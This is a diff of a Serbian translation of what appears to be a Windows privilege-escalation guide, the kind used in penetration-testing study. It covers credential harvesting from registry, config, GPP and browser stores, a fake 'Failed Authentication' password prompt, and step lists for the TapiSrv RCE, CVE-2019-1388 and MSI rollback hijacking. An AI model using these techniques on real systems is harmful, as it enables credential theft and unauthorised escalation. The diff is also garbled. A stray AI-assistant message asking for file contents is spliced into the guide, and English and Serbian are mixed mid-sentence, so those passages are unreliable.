-## Fajlovi i Registry (Credentials)
+## Datoteke i Registry (Credentials)
 
 ### Putty Creds
 ```bash
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
 ```
-### Putty SSH ključevi hosta
+### Putty SSH host ključevi
 ```
 reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
 ```
-### SSH keys u registru
+### SSH ključevi u registru
 
-SSH private keys mogu biti pohranjeni u registru pod ključem `HKCU\Software\OpenSSH\Agent\Keys`, zato proverite ima li tamo nešto zanimljivo:
+SSH privatni ključevi mogu biti sačuvani u registru pod ključem `HKCU\Software\OpenSSH\Agent\Keys`, pa biste trebali proveriti da li se tamo nalazi nešto zanimljivo:
 ```bash
 reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
 ```
-Ako pronađete bilo koji unos unutar tog puta, verovatno je to sačuvan SSH key. Pohranjen je enkriptovano, ali se može lako dekriptovati koristeći [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
+Ako pronađete bilo koji unos unutar tog puta, verovatno je sačuvan SSH key. On je sačuvan enkriptovan, ali se lako može dekriptovati koristeći [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).  
 Više informacija o ovoj tehnici ovde: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
 
-Ako `ssh-agent` servis nije pokrenut i želite da se automatski pokreće pri podizanju sistema, pokrenite:
+Ako `ssh-agent` servis nije pokrenut i želite da se automatski pokreće pri boot-u, pokrenite:
 ```bash
 Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
 ```
 > [!TIP]
-> Izgleda da ova tehnika više nije validna. Pokušao sam da kreiram neke ssh ključeve, dodam ih pomoću `ssh-add` i prijavim se putem ssh na mašinu. Registar HKCU\Software\OpenSSH\Agent\Keys ne postoji i procmon nije identifikovao upotrebu `dpapi.dll` tokom autentikacije asimetričnim ključevima.
+> Izgleda da ova tehnika više nije važeća. Pokušao sam da napravim neke ssh ključeve, dodam ih sa `ssh-add` i prijavim se preko ssh na mašinu. Registar `HKCU\Software\OpenSSH\Agent\Keys` ne postoji i procmon nije identifikovao korišćenje `dpapi.dll` tokom autentifikacije asimetričnim ključem.
 
 ### Datoteke bez nadzora
 ```
@@ -1030,7 +1040,7 @@ C:\unattend.txt
 C:\unattend.inf
 dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
 ```
-Takođe možete pretražiti ove fajlove pomoću **metasploit**: _post/windows/gather/enum_unattend_
+Takođe možete pretražiti ove fajlove koristeći **metasploit**: _post/windows/gather/enum_unattend_
 
 Primer sadržaja:
 ```xml
@@ -1061,7 +1071,7 @@ Primer sadržaja:
 %SYSTEMROOT%\System32\config\SYSTEM
 %SYSTEMROOT%\System32\config\RegBack\system
 ```
-### Kredencijali za Cloud
+### Cloud pristupni podaci
 ```bash
 #From user home
 .aws\credentials
@@ -1073,15 +1083,15 @@ AppData\Roaming\gcloud\access_tokens.db
 ```
 ### McAfee SiteList.xml
 
-Pretražite fajl nazvan **SiteList.xml**
+Potražite fajl pod nazivom **SiteList.xml**
 
-### Keširani GPP Pasword
+### Keširana GPP lozinka
 
-Ranije je postojala funkcija koja je omogućavala deployment prilagođenih lokalnih administratorskih naloga na grupu mašina putem Group Policy Preferences (GPP). Međutim, ova metoda je imala značajne sigurnosne propuste. Prvo, Group Policy Objects (GPOs), koji se čuvaju kao XML fajlovi u SYSVOL, mogli su biti pristupljeni od strane bilo kog domain korisnika. Drugo, lozinke unutar ovih GPP-ova, enkriptovane sa AES256 koristeći javno dokumentovan podrazumevani ključ, mogle su biti dekriptovane od strane bilo kog autentifikovanog korisnika. To je predstavljalo ozbiljan rizik, jer je moglo omogućiti korisnicima da dobiju povišene privilegije.
+Ranije je postojala funkcija koja je omogućavala raspoređivanje prilagođenih lokalnih administratorskih naloga na grupu računara putem Group Policy Preferences (GPP). Međutim, ova metoda je imala ozbiljne bezbednosne propuste. Prvo, Group Policy Objects (GPOs), koji su smešteni kao XML fajlovi u SYSVOL, mogli su biti pristupljeni od strane bilo kog korisnika domena. Drugo, lozinke unutar ovih GPP-ova, enkriptovane AES256 koristeći javno dokumentovani podrazumevani ključ, mogle su biti dekriptovane od strane bilo kog autentifikovanog korisnika. To je predstavljalo ozbiljan rizik, jer je moglo omogućiti korisnicima da dobiju povišene privilegije.
 
-Da bi se ublažio ovaj rizik, razvijena je funkcija koja skenira lokalno keširane GPP fajlove koji sadrže polje "cpassword" koje nije prazno. Nakon pronalaska takvog fajla, funkcija dekriptuje lozinku i vraća prilagođeni PowerShell objekat. Taj objekat sadrži detalje o GPP-u i lokaciji fajla, što pomaže pri identifikaciji i otklanjanju ove sigurnosne ranjivosti.
+Da bi se umanjio ovaj rizik, razvijena je funkcija koja skenira lokalno keširane GPP fajlove koji sadrže polje "cpassword" koje nije prazno. Kada pronađe takav fajl, funkcija dešifruje lozinku i vraća prilagođeni PowerShell objekat. Ovaj objekat sadrži detalje o GPP-u i lokaciji fajla, što pomaže u identifikaciji i otklanjanju ove bezbednosne ranjivosti.
 
-Pretražite u `C:\ProgramData\Microsoft\Group Policy\history` ili u _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre W Vista)_ za ove fajlove:
+Pretražite u `C:\ProgramData\Microsoft\Group Policy\history` ili u _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre Windows Viste)_ za sledeće fajlove:
 
 - Groups.xml
 - Services.xml
@@ -1090,7 +1100,7 @@ Pretražite u `C:\ProgramData\Microsoft\Group Policy\history` ili u _**C:\Docume
 - Printers.xml
 - Drives.xml
 
-**Da dešifrujete cPassword:**
+**Da biste dešifrovali cPassword:**
 ```bash
 #To decrypt these passwords you can decrypt it using
 gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
@@ -1099,7 +1109,7 @@ Korišćenje crackmapexec za dobijanje passwords:
 ```bash
 crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
 ```
-### IIS Web Config
+### IIS Web konfiguracija
 ```bash
 Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 ```
@@ -1113,7 +1123,7 @@ C:\inetpub\wwwroot\web.config
 Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 ```
-Primer web.config sa kredencijalima:
+Primer web.config fajla sa kredencijalima:
 ```xml
 <authentication mode="Forms">
 <forms name="login" loginUrl="/admin">
@@ -1123,7 +1133,7 @@ Primer web.config sa kredencijalima:
 </forms>
 </authentication>
 ```
-### OpenVPN kredencijali
+### OpenVPN pristupni podaci
 ```csharp
 Add-Type -AssemblyName System.Security
 $keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
@@ -1151,9 +1161,9 @@ C:\inetpub\logs\LogFiles\*
 #Apache
 Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
 ```
-### Zatražite credentials
+### Ask for credentials
 
-Uvek možete **zatražiti od korisnika da unese svoje credentials ili čak credentials nekog drugog korisnika** ako mislite da ih on može znati (primetite da je **direktno traženje** od klijenta za **credentials** zaista **rizično**):
+Možete uvek **ask the user to enter his credentials of even the credentials of a different user** ako mislite da ih može znati (imajte na umu da **asking** the client directly for the **credentials** is really **risky**):
 ```bash
 $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
 $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password
@@ -1163,7 +1173,7 @@ $cred.GetNetworkCredential() | fl
 ```
 ### **Mogući nazivi fajlova koji sadrže credentials**
 
-Poznati fajlovi koji su pre nekog vremena sadržavali **passwords** u **clear-text** ili **Base64**
+Poznati fajlovi koji su ranije sadržavali **passwords** u **clear-text** ili **Base64**
 ```bash
 $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
 vnc.ini, ultravnc.ini, *vnc*
@@ -1227,13 +1237,7 @@ TypedURLs       #IE
 %USERPROFILE%\ntuser.dat
 %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
 ```
-I don't have the file contents. Please paste the contents of the proposed files (or list the file paths you want searched), or grant access to the repository content. 
-
-Also confirm if you want me to:
-- Search for specific keywords inside those files, or
-- Translate the found English text in src/windows-hardening/windows-local-privilege-escalation/README.md into Serbian (as per your earlier instructions).
-
-Once you provide the files or confirm, I'll search and translate accordingly.
+Ne vidim sadržaj fajlova. Pošaljite sadržaj fajla src/windows-hardening/windows-local-privilege-escalation/README.md ili listu "proposed files" koje treba prevesti. Ako želite da pretražim sve predložene fajlove, navedite njihove putanje ili priložite sadržaj.
 ```
 cd C:\
 dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
@@ -1242,13 +1246,13 @@ dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd
 ```
 Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
 ```
-### Kredencijali u korpi za otpatke
+### Kredencijali u RecycleBin
 
-Takođe bi trebalo da proverite korpu za otpatke kako biste pronašli kredencijale u njoj
+Takođe proverite Bin da biste pronašli kredencijale u njemu
 
-Za **oporavak lozinki** sačuvanih od strane više programa možete koristiti: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)
+Za **oporavak lozinki** koje su sačuvane od strane više programa možete koristiti: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)
 
-### U registru
+### Unutar registra
 
 **Drugi mogući ključevi registra sa kredencijalima**
 ```bash
@@ -1261,8 +1265,8 @@ reg query "HKCU\Software\OpenSSH\Agent\Key"
 
 ### Istorija pregledača
 
-Treba da proverite dbs gde se čuvaju lozinke iz **Chrome or Firefox**.\
-Takođe proverite istoriju, bookmarks i favourites pregledača jer možda su neke **passwords** tamo sačuvane.
+Treba proveriti dbs u kojima se čuvaju lozinke iz **Chrome or Firefox**.\
+Takođe proverite istoriju, obeleživače (bookmarks) i favorite pregledača — možda su neke **lozinke** tamo sačuvane.
 
 Alati za izvlačenje lozinki iz pregledača:
 
@@ -1273,51 +1277,51 @@ Alati za izvlačenje lozinki iz pregledača:
 
 ### **COM DLL Overwriting**
 
-**Component Object Model (COM)** je tehnologija ugrađena u Windows operativni sistem koja omogućava **međusobnu komunikaciju** između softverskih komponenti napisanih u različitim jezicima. Svaka COM komponenta je **identifikovana putem class ID (CLSID)** i svaka komponenta izlaže funkcionalnost preko jedne ili više interfejsa, identifikovanih putem interface IDs (IIDs).
+**Component Object Model (COM)** je tehnologija ugrađena u Windows operativni sistem koja omogućava **međusobnu komunikaciju** između softverskih komponenti pisanih u različitim programskim jezicima. Svaka COM komponenta je **identifikovana putem class ID (CLSID)** i svaka komponenta izlaže funkcionalnost preko jednog ili više interfejsa, identifikovanih putem interface ID (IIDs).
 
-COM klase i interfejsi su definisani u registru pod **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface** respektivno. Ovaj registar se kreira spajanjem **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**
+COM klase i interfejsi su definisani u registru pod **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface** respektivno. Ovaj registar je kreiran spajanjem **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**
 
-Unutar CLSID-ova u ovom registru možete naći podregistar **InProcServer32** koji sadrži **default value** koji pokazuje na **DLL** i vrednost koja se zove **ThreadingModel** i može biti **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) ili **Neutral** (Thread Neutral).
+Unutar CLSID-ova u ovom registru možete naći child registar **InProcServer32** koji sadrži **default value** koja pokazuje na **DLL** i vrednost nazvanu **ThreadingModel** koja može biti **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) ili **Neutral** (Thread Neutral).
 
 ![](<../../images/image (729).png>)
 
-U suštini, ako možete **overwrite any of the DLLs** koje će biti izvršene, mogli biste **escalate privileges** ako će ta DLL biti izvršena od strane drugog korisnika.
+U suštini, ako možete **overwrite any of the DLLs** koje će biti izvršene, mogli biste **escalate privileges** ako će taj DLL biti izvršen od strane drugog korisnika.
 
-Da biste naučili kako napadači koriste COM Hijacking kao mehanizam za persistence, pogledajte:
+Da naučite kako napadači koriste COM Hijacking kao mehanizam za perzistenciju, pogledajte:
 
 
 {{#ref}}
 com-hijacking.md
 {{#endref}}
 
-### **Generic Password search in files and registry**
+### **Opšta pretraga lozinki u fajlovima i registru**
 
-**Search for file contents**
+**Pretraga sadržaja fajlova**
 ```bash
 cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
 findstr /si password *.xml *.ini *.txt *.config
 findstr /spin "password" *.*
 ```
-**Pretraži datoteku po određenom imenu**
+**Pretraži fajl sa određenim imenom**
 ```bash
 dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
 where /R C:\ user.txt
 where /R C:\ *.ini
 ```
-**Pretražite registar za imena ključeva i lozinke**
+**Pretražite registry za key names i passwords**
 ```bash
 REG QUERY HKLM /F "password" /t REG_SZ /S /K
 REG QUERY HKCU /F "password" /t REG_SZ /S /K
 REG QUERY HKLM /F "password" /t REG_SZ /S /d
 REG QUERY HKCU /F "password" /t REG_SZ /S /d
 ```
-### Alati koji pretražuju passwords
+### Alati koji pretražuju lozinke
 
-[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin. Napravio sam ovaj plugin da **automatski izvršava svaki metasploit POST module koji pretražuje credentials** unutar žrtve.\
-[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski pretražuje sve fajlove koji sadrže passwords pomenute na ovoj stranici.\
-[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedan odličan alat za izvlačenje passwords iz sistema.
+[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **je msf** plugin. Napravio sam ovaj plugin da **automatically execute every metasploit POST module that searches for credentials** na računaru žrtve.\
+[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski pretražuje sve fajlove koji sadrže lozinke pomenute na ovoj stranici.\
+[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedan odličan alat za izvlačenje lozinki iz sistema.
 
-Alat [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) pretražuje **sessions**, **usernames** i **passwords** nekoliko alata koji čuvaju ove podatke u clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
+Alat [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) pretražuje **sessions**, **usernames** i **passwords** kod nekoliko alata koji čuvaju ove podatke u clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
 ```bash
 Import-Module path\to\SessionGopher.ps1;
 Invoke-SessionGopher -Thorough
@@ -1326,44 +1330,44 @@ Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ```
 ## Leaked Handlers
 
-Zamislite da **proces koji radi kao SYSTEM otvori novi proces** (`OpenProcess()`) sa **punim pristupom**. Isti proces **takođe kreira novi proces** (`CreateProcess()`) **sa niskim privilegijama ali nasleđuje sve otvorene handles glavnog procesa**.\
-Ako imate **puni pristup procesu sa niskim privilegijama**, možete dohvatiti **otvoreni handle prema privilegovanom procesu kreiranom** sa `OpenProcess()` i **injektovati shellcode**.\
-[Pročitajte ovaj primer za više informacija o **kako otkriti i iskoristiti ovu ranjivost**.](leaked-handle-exploitation.md)\
-[Pročitajte **drugi post za potpunije objašnjenje kako testirati i zloupotrebiti više otvorenih handle-ova procesa i thread-ova nasleđenih sa različitim nivoima permisija (ne samo puni pristup)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
+Zamislite da **proces koji se izvršava kao SYSTEM otvori novi proces** (`OpenProcess()`) sa **punim pristupom**. Isti proces **takođe kreira novi proces** (`CreateProcess()`) **sa niskim privilegijama ali nasleđujući sve otvorene handle-ove glavnog procesa**.\
+Ako imate **pun pristup niskoprivilegovanom procesu**, možete dohvatiti **otvoreni handle ka privilegovanom procesu kreiranom** pomoću `OpenProcess()` i **ubaciti shellcode**.\
+[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
+[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
 
 ## Named Pipe Client Impersonation
 
-Shared memory segments, referred to as **pipes**, omogućavaju komunikaciju procesa i prenos podataka.
+Segmenti deljene memorije, poznati kao **pipes**, omogućavaju komunikaciju procesa i razmenu podataka.
 
-Windows pruža funkcionalnost pod nazivom **Named Pipes**, koja omogućava nepovezanim procesima da dele podatke, čak i preko različitih mreža. Ovo podseća na client/server arhitekturu, sa ulogama definisanim kao **named pipe server** i **named pipe client**.
+Windows pruža funkcionalnost nazvanu **Named Pipes**, koja omogućava nepovezanim procesima da dele podatke, čak i preko različitih mreža. Ovo podseća na client/server arhitekturu, sa ulogama definisanim kao **named pipe server** i **named pipe client**.
 
-Kada podaci prolaze kroz pipe od strane **client-a**, **server** koji je napravio pipe ima mogućnost da **preuzme identitet** **client-a**, ukoliko poseduje neophodna prava **SeImpersonate**. Identifikovanje **privilegovanog procesa** koji komunicira putem pipe-a koji možete imitirati pruža priliku da **dobijete više privilegija** preuzimanjem identiteta tog procesa kada on interaguje sa pipe-om koji ste vi uspostavili. Za instrukcije kako izvesti takav napad, korisni vodiči su dostupni [**ovde**](named-pipe-client-impersonation.md) i [**ovde**](#from-high-integrity-to-system).
+Kada podaci budu poslati kroz pipe od strane **client**, **server** koji je napravio pipe ima mogućnost da **preuzme identitet** **client-a**, pod uslovom da poseduje neophodna **SeImpersonate** prava. Pronalazak **privilegovanog procesa** koji komunicira preko pipe-a koji možete imitirati daje priliku da **stečete veće privilegije** preuzimanjem identiteta tog procesa kada on interaguje sa pipe-om koji ste vi postavili. Za uputstva kako izvesti takav napad, korisni vodiči su dostupni [**here**](named-pipe-client-impersonation.md) i [**here**](#from-high-integrity-to-system).
 
-Takođe, sledeći alati omogućavaju da **interceptujete named pipe komunikaciju pomoću alata kao što je burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **i ovaj alat omogućava listanje i pregled svih pipe-ova kako biste našli privesc-e** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
+Takođe, sledeći alat omogućava da **presretnete komunikaciju named pipe-a alatkom poput burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a ovaj alat omogućava listanje i pregled svih pipe-ova da biste našli privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
 
 ## Telephony tapsrv remote DWORD write to RCE
 
-Telephony servis (TapiSrv) u serverskom režimu izlaže `\\pipe\\tapsrv` (MS-TRP). Remote autentifikovani klijent može zloupotrebiti mailslot-based async event path da pretvori `ClientAttach` u arbitrarni **4-byte write** na bilo koji postojeći fajl upisiv od strane `NETWORK SERVICE`, zatim stekne Telephony admin prava i učita proizvoljan DLL kao servis. Potpuni tok:
+The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). Udaljeni autentifikovani klijent može zloupotrebiti mailslot-based async event path da pretvori `ClientAttach` u proizvoljno **4-byte write** u bilo koji postojeći fajl koji je upisiv od strane `NETWORK SERVICE`, potom stekne Telephony admin prava i učita proizvoljan DLL kao servis. Kompletan tok:
 
-- `ClientAttach` sa `pszDomainUser` postavljenim na postojeći put koji je upisiv → servis ga otvara preko `CreateFileW(..., OPEN_EXISTING)` i koristi ga za async event writes.
-- Svaki event upisuje attacker-controlled `InitContext` iz `Initialize` u taj handle. Registrujte line app sa `LRegisterRequestRecipient` (`Req_Func 61`), pokrenite `TRequestMakeCall` (`Req_Func 121`), dohvatite preko `GetAsyncEvents` (`Req_Func 0`), zatim unregister/shutdown da biste ponovili determinističke upise.
+- `ClientAttach` sa `pszDomainUser` postavljenim na postojeću putanju koja je upisiva → servis je otvara preko `CreateFileW(..., OPEN_EXISTING)` i koristi za async event writes.
+- Svaki event zapisuje attacker-controlled `InitContext` iz `Initialize` u taj handle. Registrujte line app sa `LRegisterRequestRecipient` (`Req_Func 61`), pokrenite `TRequestMakeCall` (`Req_Func 121`), preuzmite preko `GetAsyncEvents` (`Req_Func 0`), zatim unregister/shutdown da ponovite determinističke zapise.
 - Dodajte sebe u `[TapiAdministrators]` u `C:\Windows\TAPI\tsec.ini`, reconnect-ujte se, zatim pozovite `GetUIDllName` sa proizvoljnom putanjom do DLL-a da izvršite `TSPI_providerUIIdentify` kao `NETWORK SERVICE`.
 
-Više detalja:
+More details:
 
 {{#ref}}
 telephony-tapsrv-arbitrary-dword-write-to-rce.md
 {{#endref}}
 
-## Ostalo
+## Razno
 
-### Ekstenzije fajlova koje mogu izvršavati kod u Windows
+### Ekstenzije fajlova koje mogu izvršavati stvari u Windows
 
 Pogledajte stranicu **[https://filesec.io/](https://filesec.io/)**
 
-### **Praćenje komandnih linija zbog lozinki**
+### **Monitoring Command Lines for passwords**
 
-Kada dobijete shell kao korisnik, mogu postojati zakazani zadaci ili drugi procesi koji se izvršavaju i prosleđuju kredencijale putem komandne linije. Skripta ispod snima process command lines svakih dve sekunde i upoređuje trenutno stanje sa prethodnim stanjem, ispisujući sve razlike.
+Kada dobijete shell kao korisnik, mogu postojati scheduled tasks ili drugi procesi koji se izvršavaju i koji **prosleđuju kredencijale u komandnoj liniji**. Skripta ispod hvata process command lines na svake dve sekunde i upoređuje trenutni stanje sa prethodnim, ispisujući sve razlike.
 ```bash
 while($true)
 {
@@ -1377,9 +1381,9 @@ Compare-Object -ReferenceObject $process -DifferenceObject $process2
 
 ## Od Low Priv User do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass
 
-Ako imate pristup grafičkom interfejsu (putem konzole ili RDP) i UAC je omogućen, u nekim verzijama Microsoft Windows-a moguće je pokrenuti terminal ili bilo koji drugi proces kao "NT\AUTHORITY SYSTEM" iz neprivilegovanog korisnika.
+Ako imate pristup grafičkom interfejsu (putem konzole ili RDP) i UAC je omogućen, u nekim verzijama Microsoft Windows-a moguće je pokrenuti terminal ili bilo koji drugi proces kao što je "NT\AUTHORITY SYSTEM" iz naloga bez privilegija.
 
-Ovo omogućava eskalaciju privilegija i zaobilaženje UAC-a istovremeno istom ranjivošću. Dodatno, nema potrebe ništa instalirati, a binarni fajl koji se koristi tokom procesa je potpisan i izdat od strane Microsoft-a.
+Ovo omogućava eskalaciju privilegija i bypass UAC-a istovremeno koristeći istu ranjivost. Dodatno, nije potrebno ništa instalirati, a binary koji se koristi tokom procesa je potpisan i izdat od strane Microsoft-a.
 
 Neki od pogođenih sistema su sledeći:
 ```
@@ -1403,7 +1407,7 @@ Windows 10 1607	14393	** link OPENED AS SYSTEM **
 Windows 10 1703	15063	link NOT opened
 Windows 10 1709	16299	link NOT opened
 ```
-To exploit this vulnerability, potrebno je izvršiti sledeće korake:
+Da biste iskoristili ovu ranjivost, potrebno je izvršiti sledeće korake:
 ```
 1) Right click on the HHUPD.EXE file and run it as Administrator.
 
@@ -1421,20 +1425,16 @@ To exploit this vulnerability, potrebno je izvršiti sledeće korake:
 
 8) Remember to cancel setup and the UAC prompt to return to your desktop.
 ```
-You have all the necessary files and information in the following GitHub repository:
-
-https://github.com/jas502n/CVE-2019-1388
-
 ## From Administrator Medium to High Integrity Level / UAC Bypass
 
-Pročitajte ovo da biste saznali o nivoima integriteta:
+Read this to **learn about Integrity Levels**:
 
 
 {{#ref}}
 integrity-levels.md
 {{#endref}}
 
-Zatim **pročitajte ovo da biste saznali o UAC i UAC bypass-ovima:**
+Then **read this to learn about UAC and UAC bypasses:**
 
 
 {{#ref}}
@@ -1445,184 +1445,184 @@ Zatim **pročitajte ovo da biste saznali o UAC i UAC bypass-ovima:**
 
 The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).
 
-The attack basically consist of abusing the Windows Installer's rollback feature to replace legitimate files with malicious ones during the uninstallation process. For this the attacker needs to create a **malicious MSI installer** that will be used to hijack the `C:\Config.Msi` folder, which will later be used by he Windows Installer to store rollback files during the uninstallation of other MSI packages where the rollback files would have been modified to contain the malicious payload.
+Napad se u suštini sastoji u zloupotrebi Windows Installer-ove rollback feature da zameni legitimne fajlove malicioznim tokom procesa deinstalacije. Za ovo napadač treba da kreira **malicious MSI installer** koji će biti korišćen za hijack-ovanje `C:\Config.Msi` foldera, koji će kasnije Windows Installer koristiti za čuvanje rollback fajlova tokom deinstalacije drugih MSI paketa gde su rollback fajlovi modifikovani da sadrže maliciozni payload.
 
-The summarized technique is the following:
+Sažeta tehnika je sledeća:
 
 1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**
 
 - Step 1: Install the MSI
-- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
-- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
-- Keep a **handle** open to the file after install.
+- Kreirajte `.msi` koji instalira bezopasan fajl (npr. `dummy.txt`) u zapisivi folder (`TARGETDIR`).
+- Obeležite installer kao **"UAC Compliant"**, tako da ga **non-admin user** može pokrenuti.
+- Zadržite **handle** otvoren za fajl nakon instalacije.
 
 - Step 2: Begin Uninstall
-- Uninstall the same `.msi`.
-- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
-- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.
+- Deinstalirajte isti `.msi`.
+- Proces deinstalacije počinje da premšta fajlove u `C:\Config.Msi` i preimenuje ih u `.rbf` fajlove (rollback backups).
+- **Poll the open file handle** koristeći `GetFinalPathNameByHandle` da detektujete kada fajl postane `C:\Config.Msi\<random>.rbf`.
 
 - Step 3: Custom Syncing
-- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
-- Signals when `.rbf` has been written.
-- Then **waits** on another event before continuing the uninstall.
+- `.msi` uključuje **custom uninstall action (`SyncOnRbfWritten`)** koja:
+- Signalizira kada je `.rbf` napisan.
+- Zatim **čeka** na drugi event pre nego što nastavi deinstalaciju.
 
 - Step 4: Block Deletion of `.rbf`
-- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
-- Then **signal back** so the uninstall can finish.
-- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.
+- Kada se signal primi, **otvorite `.rbf` fajl** bez `FILE_SHARE_DELETE` — ovo **sprečava njegovo brisanje**.
+- Zatim **vratite signal** tako da deinstalacija može da se završi.
+- Windows Installer ne uspeva da obriše `.rbf`, i pošto ne može da obriše sav sadržaj, **`C:\Config.Msi` se ne uklanja**.
 
 - Step 5: Manually Delete `.rbf`
-- You (attacker) delete the `.rbf` file manually.
-- Now **`C:\Config.Msi` is empty**, ready to be hijacked.
+- Vi (napadač) ručno izbrišete `.rbf` fajl.
+- Sada je **`C:\Config.Msi` prazan**, spreman za hijack.
 
-> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.
+> U ovoj tački, **trigger the SYSTEM-level arbitrary folder delete vulnerability** da obrišete `C:\Config.Msi`.
 
 2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**
 
 - Step 6: Recreate `C:\Config.Msi` with Weak ACLs
-- Recreate the `C:\Config.Msi` folder yourself.
